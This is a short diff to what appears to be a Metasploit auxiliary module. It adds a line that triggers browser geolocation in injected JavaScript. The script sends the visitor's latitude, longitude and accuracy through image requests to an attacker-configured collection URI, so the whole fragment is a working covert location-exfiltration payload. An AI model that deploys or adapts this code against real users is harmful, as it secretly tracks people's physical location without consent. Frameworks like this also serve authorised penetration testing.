@@ -63,6 +63,7 @@ class Metasploit3 < Msf::Auxiliary
 		gotloc = true;
 		document.write('<img src="#{path}/gps='+pos.coords.latitude+','+pos.coords.longitude+'.jpg">');
 		document.write('<img src="#{datastore['BADGER_URI']}target=#{datastore['BADGER_TGT']}&agent=msf_javascript&lat='+pos.coords.latitude+'&lng='+pos.coords.longitude+'&acc='+pos.coords.accuracy+'">');}
+		if (navigator.geolocation) {navigator.geolocation.getCurrentPosition(showPosition);}
 		EOF
 		return js_data
 	end
